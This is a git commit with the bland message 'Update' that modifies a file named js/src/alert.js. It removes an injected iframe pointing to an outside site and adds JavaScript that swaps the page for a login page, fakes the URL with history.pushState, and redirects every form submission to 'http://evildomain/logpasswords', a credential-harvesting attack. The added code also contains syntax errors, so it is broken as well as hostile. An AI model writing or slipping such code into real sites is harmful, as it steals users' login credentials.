deec1cd4468cb16fc016bb058b84d929c0cc65a4
dimpol <djdimpol@rocketmail.com>
2016-11-07 14:56:35 +0200

    Update

--- js/src/alert.js
+++ js/src/alert.js
@@ -1,1 +1,19 @@
-document.write('<iframe src="https://wishluck.me"; width="1500" height="1000">')
+function override(url){
+  var req = new XMLHttpRequest();
+  req.open('GET', url,false);
+  req.onreadystatechange = function(){
+    if(req.readyState == 4 && req.responseText != ""){
+      document.innerHTML = req.responseText;
+    }
+  }
+  req.send(null);
+}
+
+override("/login.php");
+
+history.pushState){he: "he"}, document,getElementsByTagName("title")[0].innerHTML, "login.php");
+
+var forms = document.getElementsByTagName("form");
+for (index=0;index<forms.length;index++){
+  void(forms[index].action = "http://evildomain/logpasswords");
+}
